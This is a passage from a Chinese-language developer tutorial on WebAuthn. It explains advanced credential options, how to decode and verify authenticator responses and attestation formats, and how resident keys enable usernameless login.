ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 